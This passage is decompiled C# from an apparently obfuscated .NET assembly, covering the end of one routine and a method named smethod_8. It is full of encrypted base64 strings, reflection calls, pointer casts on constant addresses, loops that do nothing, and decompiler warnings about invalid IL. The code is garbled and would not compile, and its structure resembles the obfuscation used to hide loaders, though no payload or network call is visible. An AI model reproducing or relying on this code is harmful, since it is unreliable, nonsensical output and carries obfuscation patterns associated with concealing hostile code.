		num2 = (nint)checked((unchecked((nuint)unchecked((nint)default(IntPtr))) - unchecked((nuint)(nint)(IntPtr)Class1.smethod_2(text)) - unchecked((nuint)unchecked((nint)default(IntPtr)))) * unchecked((nuint)unchecked((nint)default(IntPtr))));
		num2 = default(IntPtr);
		int num12 = (int)((ulong*)val3)->ToString(sbyte.TryParse(((nint)((IntPtr)(nint)checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * unchecked((nuint)unchecked((nint)default(IntPtr)))) + num10)) as string, style, formatProvider, out reference) as string, null);
		int num13 = (int)Settings.Default;
		num10 = (int)checked(unchecked((uint)(int)Class1.smethod_1(default(BindingFlags), null, null, (ParameterModifier[])(object)Class0.smethod_0())) - 615617018u);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num14);
		num10 = (int)((uint)num12 / checked(unchecked((uint)num13) - unchecked(235889396u / (uint)num14)));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num15);
		object obj22 = (nint)(IntPtr)num15;
		StringSplitOptions options = (StringSplitOptions)((obj22 is StringSplitOptions) ? obj22 : null);
		object obj23 = text3.LastIndexOfAny((char[])(object)text4.Split((char[]?)null, options));
		num10 = (int)checked(unchecked((uint)((bool*)((obj23 is bool) ? obj23 : null))->CompareTo(((int*)((ulong*)829447968L)->GetHashCode())->GetHashCode() as object)) * 2915570831u);
		formatProvider = char.IsLower(s3, num10) as IFormatProvider;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
		formatProvider = formatProvider2;
		IFormatProvider provider2 = formatProvider;
		ushort num16 = (ushort)Class0.smethod_0();
		byte[] byte_ = null;
		uint num17 = num16 / checked(63738u - unchecked((uint)(ushort)Class1.smethod_0(byte_, Class0.smethod_0())));
		num5 = 63738;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num18);
		num5 = (ushort)(num17 / num18);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num19);
		if (!(((ulong*)val)->CompareTo(int.TryParse(s2, default(NumberStyles), provider2, out *(int*)((ushort*)num19)->ToString(formatProvider)) as object) is bool))
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte reference3);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider3);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct4 @struct);
			while (flag)
			{
				NumberStyles style4 = style;
				formatProvider = null;
				reference3 = ref reference3;
				if ((byte.TryParse("PY6VZcFpS8yA7l3bgeBD5pWcz/31TwSU3LQtkK51rbYihZM9+nvtBtUavyqFtydHZWAy2/Q=", style4, provider3, out reference3) ? 1u : 0u) / 1u == 0)
				{
					string s6 = text;
					object obj24 = char.IsLetter('梴');
					object obj25 = ((obj24 is NumberStyles) ? obj24 : null);
					IFormatProvider provider4 = (IFormatProvider)(object)Class0.smethod_0();
					string text7 = text;
					CultureInfo culture = null;
					sbyte num20 = (sbyte)text7.ToLower(culture);
					string text8 = text;
					char[] anyOf = null;
					int style5 = (int)obj25;
					object obj26 = ((sbyte*)checked(num20 - /*isinst with value type is only supported in some contexts*/))->GetTypeCode();
					_ = long.TryParse(s6, (NumberStyles)style5, provider4, out *(long*)((obj26 is ref long) ? obj26 : null)) is byte;
				}
				else
				{
					_ = ((short*)num8)->GetTypeCode() is Struct4;
					@struct = @struct;
					@struct = default(Struct4);
				}
			}
		}
		_ = char.TryParse(text, out *(char*)null) is Class1;
		_ = ((ushort*)22668)->GetTypeCode() is Struct3;
		ulong num21 = num21;
		ulong num22 = num21;
		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text9);
		_ = (Struct3)((ulong*)num22)->ToString(text9);
		Struct3 struct2 = default(Struct3);
		_ = ((ulong*)(ulong)Settings.Default)->CompareTo(null) is ulong;
		while (flag)
		{
			_ = (_003CPrivateImplementationDetails_003E)(object)Class0.smethod_0();
		}
	}

	unsafe static void smethod_8()
	{
		//IL_001b: Expected O, but got I4
		//IL_002d: Expected O, but got I4
		//IL_0055: Expected O, but got I4
		//IL_0086: Expected O, but got I8
		//IL_0092: Expected O, but got I4
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected I4, but got Unknown
		//IL_00cd: Expected O, but got I4
		//IL_00e2: Expected O, but got I4
		//IL_012c: Expected O, but got I4
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Expected I4, but got Unknown
		//IL_014e: Expected O, but got I4
		//IL_01b4: Expected O, but got I4
		//IL_01f1: Expected O, but got I4
		//IL_01fa: Expected I4, but got O
		//IL_01fb: Expected O, but got I4
		//IL_021b: Expected O, but got I4
		//IL_0225: Expected I4, but got O
		//IL_0231: Expected O, but got I4
		//IL_0248: Expected O, but got I4
		//IL_0266: Expected O, but got I4
		//IL_0270: Expected O, but got I4
		//IL_0276: Expected I4, but got O
		//IL_02f0: Expected O, but got I4
		//IL_0307: Expected O, but got I4
		//IL_0310: Expected I4, but got O
		//IL_0311: Expected O, but got I4
		//IL_031a: Expected I4, but got O
		//IL_031b: Expected O, but got I4
		//IL_0320: Expected I4, but got O
		//IL_0336: Expected O, but got I4
		//IL_0372: Expected O, but got I4
		//IL_037b: Expected I4, but got O
		//IL_037c: Expected O, but got I4
		//IL_03b4: Expected O, but got I4
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ce: Expected I8, but got Unknown
		//IL_03cf: Expected O, but got I4
		//IL_043c: Expected O, but got I4
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		//IL_044b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0451: Expected Ref, but got Unknown
		//IL_0452: Expected O, but got I4
		//IL_0456: Unknown result type (might be due to invalid IL or missing references)
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Expected I4, but got Unknown
		//IL_045f: Expected O, but got I4
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ac: Expected O, but got I8
		//IL_04c0: Expected O, but got I4
		//IL_04f1: Expected O, but got I4
		//IL_0513: Expected O, but got I4
		//IL_051d: Expected I4, but got O
		//IL_0549: Expected O, but got I4
		//IL_054d: Unknown result type (might be due to invalid IL or missing references)
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_055f: Expected Ref, but got Unknown
		//IL_0560: Expected O, but got I
		//IL_057d: Expected O, but got I4
		//IL_0586: Unknown result type (might be due to invalid IL or missing references)
		//IL_058c: Expected Ref, but got Unknown
		//IL_058d: Expected O, but got I4
		//IL_05cf: Expected O, but got I4
		//IL_05e3: Expected O, but got I4
		//IL_0604: Expected O, but got I4
		//IL_0621: Expected O, but got I4
		//IL_0632: Expected O, but got I4
		//IL_066f: Expected O, but got I4
		//IL_067f: Expected O, but got I
		//IL_068b: Expected O, but got I4
		//IL_0691: Expected I4, but got O
		//IL_06ab: Expected O, but got I4
		//IL_06c1: Expected O, but got I4
		//IL_06da: Expected O, but got I4
		//IL_06e4: Expected O, but got I8
		//IL_06ed: Expected I, but got O
		//IL_06ee: Expected O, but got I
		//IL_06f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f8: Expected I4, but got Unknown
		//IL_06f9: Expected O, but got I4
		//IL_0722: Expected O, but got I
		//IL_0755: Expected O, but got I4
		//IL_0799: Expected O, but got I4
		bool flag;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref long reference);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref long reference2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] array2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ushort reference4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj11);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num9);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num11);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num12);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num13);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_7);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num14);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num15);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num16);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num6);
		while (true)
		{
			flag = false;
			if (0u / 0u == 0)
			{
				break;
			}
			string s4;
			NumberStyles style3;
			do
			{
				numberStyles = numberStyles;
				b = b;
				byte num = b;
				string s = text;
				NumberStyles style = (NumberStyles)Class0.smethod_0();
				IFormatProvider formatProvider = null;
				reference = ref reference;
				reference = ref reference2;
				_ = long.TryParse(s, style, formatProvider, out reference) is string;
				text = "p1TDSCdK4/QnoqIRQV09WLKwdv+js9meEPwhmgtNt3hjdou0Th8ux63DQb1Ff5MqLvhUGXI=";
				ref _003F reference3 = ref *(_003F*)num;
				object obj = char.IsLetter(text, (int)/*isinst with value type is only supported in some contexts*/);
				object obj2 = System.Runtime.CompilerServices.Unsafe.As<_003F, byte>(ref reference3).CompareTo((byte)(int)((obj is byte) ? obj : null));
				numberStyles = (NumberStyles)((obj2 is NumberStyles) ? obj2 : null);
				bool num2 = int.TryParse("7HNKVDAJP6w2HM6NgPDhS+AOq6jDCdZmoHvv+E5ft+xKa4uSfz6tZuiOfqtF3K1pb71jSGw=", numberStyles, ((sbyte*)(sbyte)Class5.smethod_0("jUJYwT4TJOXMkSDkKELcFe8iwn4UL/D6y4tkMHLXm3Md4nogUFswri8ay6YgFi94qrl5ztc="))->GetHashCode() as IFormatProvider, out *(int*)null);
				bool num3 = char.TryParse(text, out *(char*)null);
				bindingFlags = bindingFlags;
				BindingFlags bindingFlags_ = bindingFlags;
				array = array;
				PropertyInfo[] propertyInfo_ = array;
				text = (string)(object)Settings.Default;
				object obj3 = ((ulong*)1524889407L)->GetTypeCode();
				Type type = text2.IsNormalized((NormalizationForm)((obj3 is NormalizationForm) ? obj3 : null)) as Type;
				Type type_ = type;
				string s2 = (string)(object)Settings.Default;
				uint num4 = 1778684890u;
				object obj4 = short.Parse(s2, (NumberStyles)((uint*)1778684890)->ToString((IFormatProvider?)null));
				object obj5 = ((obj4 is long) ? obj4 : null);
				num5 = num5;
				array2 = ((long*)(-1471771671L))->Equals((long)checked(obj5 * (18446744072674805331uL * unchecked((ulong)num5)))) as Type[];
				Type[] type_2 = array2;
				PropertyInfo[] propertyInfo_2 = array;
				Type[] type_3 = array2;
				parameterModifier_ = (ParameterModifier[])(object)Class5.smethod_2();
				BindingFlags bindingFlags_2 = (BindingFlags)Class2.smethod_2(default(BindingFlags), propertyInfo_2, null, type_3, parameterModifier_);
				array = array;
				text = (string)(object)Class2.smethod_2(bindingFlags_, propertyInfo_, type_, type_2, (ParameterModifier[])(object)Class1.smethod_2((string)(object)Class1.smethod_3(bindingFlags_2, propertyInfo_3, type, null, parameterModifier_)));
				object obj6 = ((bool*)1)->CompareTo((byte)checked(0 + /*isinst with value type is only supported in some contexts*/+ 1) != 0);
				if (num2 / ((obj6 is bool) ? obj6 : null) == 0)
				{
					string s3 = text;
					NumberStyles style2 = numberStyles;
					reference4 = ref reference4;
					object obj7 = ushort.TryParse(s3, style2, formatProvider, out reference4);
					object obj8 = ((uint*)((obj7 is uint) ? obj7 : null))->GetTypeCode();
					b2 = (sbyte)(int)((obj8 is sbyte) ? obj8 : null);
					_ = (byte)((sbyte*)b2)->ToString(formatProvider);
					num6 = -21446;
					_ = (byte)((short*)(-21446))->ToString((IFormatProvider?)null);
					b = (byte)((byte)char.ConvertFromUtf32(((ulong*)679691377L)->CompareTo(476515784uL)) / b);
					b = b3;
				}
				s4 = (string)(object)Settings.Default;
				object obj9 = ((sbyte*)78)->GetHashCode();
				object obj10 = ((obj9 is short) ? obj9 : null);
				sbyte num7 = b2;
				obj11 = obj11;
				_ = ((sbyte*)num7)->Equals(obj11) is short;
				num8 = num8;
				PropertyInfo[] propertyInfo_4 = array;
				num9 = num9;
				int num10 = num9;
				string text3 = text;
				object obj12 = ((ushort*)36731)->CompareTo(obj11);
				object obj13 = ((obj12 is uint) ? obj12 : null);
				num4 = num4;
				_ = (long)((int*)(-1233286196))->ToString();
				string text4 = text;
				object obj14 = char.IsLower(long.Parse(text, formatProvider) as string, num9);
				num5 = (long)checked((unchecked((ulong)(long)text4.Substring(checked(-1393793113 * ((obj14 is int) ? obj14 : null) + -2004882407))) - 18446744071806000610uL) * unchecked((ulong)num5) * unchecked((ulong)num5));
				bindingFlags = default(BindingFlags);
				BindingFlags bindingFlags_3 = bindingFlags;
				object obj15 = sbyte.TryParse((string)(object)Class2.smethod_2(type_1: IntPtr.Size as Type, bindingFlags_0: default(BindingFlags), propertyInfo_0: (PropertyInfo[])(object)((long*)num11)->ToString((string)(object)Class1.smethod_3(bindingFlags_3, null, type_5, array2, char.ToUpper('\ue2a5') as ParameterModifier[])), type_2: array2, parameterModifier_0: null), default(NumberStyles), null, out *(sbyte*)((long*)981269654L)->ToString());
				num4 = (uint)checked(((obj15 is uint) ? obj15 : null) + 442309917);
				type = (Type)(object)((int*)num10)->ToString(text3, ((uint*)obj13)->Equals(checked((num12 + num13) * unchecked((uint)((uint*)num4)->ToString()))) as IFormatProvider);
				type = type2;
				Type[] type_6 = array2;
				array3 = (byte[])(object)Class5.smethod_0((string)(object)Class0.smethod_0());
				checked
				{
					_ = unchecked((ushort)Class2.smethod_2(default(BindingFlags), propertyInfo_4, type_7, type_6, (ParameterModifier[])(object)Class1.smethod_0(array3, array3))) + unchecked((ushort)Class0.smethod_0());
					num8 = num8;
					num8 = num14;
					num8 = num8;
				}
				num6 = (short)(checked(unchecked((uint)(short)((long*)(long)string.Format(((ushort*)num8)->GetHashCode() as IFormatProvider, "CLbGxXdi0QZXCmq98/2iFwNAeYTgvepLttC6litk2wLvE+JTrnWuRUda6z8F1qqkG9hVA8U=", obj11))->ToString("NYkFdphF8Xz7sjrVodPVn8YwbW30Hvz5Mk8V/cYb1Qe3vZ8VKduzQ7KdrbNLRpYVL0mXyrc=", formatProvider)) * unchecked((uint)num6)) / (uint)num6);
				num6 = num15;
				ref _003F reference5 = ref *(_003F*)obj10;
				object obj16 = ((short*)checked(unchecked((uint)num16) + unchecked((uint)num6)))->GetHashCode();
				object obj17 = System.Runtime.CompilerServices.Unsafe.As<_003F, short>(ref reference5).CompareTo((short)(int)((obj16 is short) ? obj16 : null));
				object obj18 = ((obj17 is BindingFlags) ? obj17 : null);
				Type type_8 = type;
				string s5 = (string)(object)Class0.smethod_0();
				numberStyles = default(NumberStyles);
				style3 = (NumberStyles)Class1.smethod_3((BindingFlags)obj18, null, type_8, short.Parse(s5, numberStyles) as Type[], null);
				text = uint.Parse(text) as string;
			}
			while (sbyte.Parse(s4, style3, (IFormatProvider)Class5.smethod_1(string_2)) is bool);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Class3 @class);
		if (!flag)
		{
			string s6 = text;
			MethodBase[] array4 = array4;
			Class3 obj19 = long.Parse(s6, (NumberStyles)Class2.smethod_0(default(BindingFlags), array4, array2, parameterModifier_), (IFormatProvider)(object)Settings.Default) as Class3;
			@class = @class;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Class3 class2);
			@class = class2;
			@class = obj19;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num17);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IntPtr intPtr3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ushort num19);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num21);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong reference7);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong reference6);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref ulong reference8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref int reference9);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s10);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out CultureInfo cultureInfo);
		IntPtr num22;
		do
		{
			string s7 = IntPtr.Size as string;
			numberStyles = default(NumberStyles);
			numberStyles = numberStyles2;
			IntPtr intPtr = (IntPtr)Class1.smethod_0(null, array3);
			object obj20 = ushort.Parse(text, (IFormatProvider)(object)Class0.smethod_0());
			object obj21 = ((obj20 is BindingFlags) ? obj20 : null);
			PropertyInfo[] propertyInfo_5 = array;
			num17 = num17;
			IntPtr intPtr2 = (IntPtr)Class1.smethod_3((BindingFlags)obj21, propertyInfo_5, (Type)(object)((ulong*)num17)->ToString(text), short.Parse("l/YCrzj6X+A9QeDG9YrfMeVRQPjZfVRQlODuv4QVagvA6T2WOcV5P1bSSYmgBCuH+8MfOXw=") as Type[], null);
			intPtr2 = intPtr3;
			object obj22 = ((int*)((uint)(int)string.Join(text, (object?[])null) / (uint)num9))->CompareTo(obj11);
			ushort num18 = (ushort)(object)((IntPtr*)checked(unchecked((nuint)(nint)intPtr) - (unchecked((nuint)unchecked((nint)default(IntPtr))) + ((obj22 is IntPtr) ? obj22 : null)) + unchecked((nuint)unchecked((nint)default(IntPtr)))))->ToPointer();
			num8 = num8;
			object obj23 = ((ushort*)checked(num18 - (unchecked((uint)num19) - 64242u - 44876u)))->GetTypeCode();
			IFormatProvider provider = ((sbyte*)checked(((obj23 is sbyte) ? obj23 : null) - -100))->GetTypeCode() as IFormatProvider;
			text = "56wuGtWHXNgOa+93oADNJSht9s22XXYkVeCDVlwbWUTEm+Y/tuvQx8UEG/hfymKpnCj+BRc=";
			_ = ref *(ulong*)(text5 + "m/FFzQAAtIW2SxXoAFQjN20RynCGrVE8/nIQtbJo87CkPVBF7ip5P7RgEX9xP+JeGw7n/Fw=" + ((uint*)915684795)->ToString((IFormatProvider?)null) + text);
			ulong num20 = num17;
			num17 = checked(852132868uL * num17);
			_ = ((ulong*)checked(num20 * num21))->CompareTo(obj11) is ref ulong;
			reference6 = ref reference6;
			text = uint.Parse("kqgVpL8gLKGUFjC3y5jm2B420CgyMXSG+CNdxiCuFXUImvclo3MxPlIXKN4f/f71tCEZLuU=", numberStyles) as string;
			object obj24 = char.IsUpper(s8, (int)Class5.smethod_1((string)(object)Settings.Default));
			reference6 = ref *(ulong*)((obj24 is ref ulong) ? obj24 : null);
			reference6 = ref reference7;
			reference6 = ref reference8;
			string s9 = text;
			reference9 = ref reference9;
			_ = int.TryParse(s9, out reference9) is ref ulong;
			reference6 = ref reference6;
			object obj25 = ulong.TryParse(s7, style4, provider, out reference6);
			_ = (ulong)((ulong*)((obj25 is ulong) ? obj25 : null))->ToString((string)(object)Settings.Default);
			text = (string)(object)Class0.smethod_0();
			object obj26 = uint.TryParse(s10, numberStyles, (IFormatProvider)(object)Settings.Default, out *(uint*)null);
			object obj27 = ((obj26 is int) ? obj26 : null);
			string s11 = text;
			string a = ((nint)(IntPtr)1881730407) as string;
			object obj28 = char.IsSeparator(c);
			c = (char)(int)((obj28 is char) ? obj28 : null);
			checked
			{
				uint c2 = unchecked((uint)c / 48079u) + 12935u;
				cultureInfo = cultureInfo;
				object obj29 = ulong.Parse(s11, unchecked(string.Equals(a, char.ToLower((char)c2, cultureInfo) as string, (StringComparison)((uint*)1767181508)->ToString(((IntPtr*)/*isinst with value type is only supported in some contexts*/)->ToString()))) as IFormatProvider);
				_ = char.IsControl("m0W4+XQpZB2tDrq56h5y1LrkPL/nN/06shUo32VgiOaXL+3jey4sJeq6jXc7+kHW64RFbiQ=", obj27 - unchecked((int)(object)(void*)(IntPtr)((obj29 is IntPtr) ? obj29 : null))) is Settings;
				intPtr2 = default(IntPtr);
				num22 = intPtr2;
				intPtr2 = intPtr2;
			}
		}
		while (((nint)IntPtr.Subtract((nint)checked(unchecked((nuint)(nint)num22) - unchecked((nuint)unchecked((nint)default(IntPtr)))), -1827273570)) is bool);
		bindingFlags = default(BindingFlags);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_4);
		num6 = (short)Class1.smethod_1(bindingFlags_4, null, (Type[])(object)Class5.smethod_2(), char.IsDigit(text, -665931584) as ParameterModifier[]);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num23);
		_ = (Class3)(object)((short*)checked(7067u + unchecked((uint)num23)))->ToString(text);
		_ = (Struct4)((bool*)null)->ToString();
		@class = @class;
		num6 = (short)Class0.smethod_0();
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num24);
		_ = ((short*)num24)->CompareTo(null) is string;
	}
}
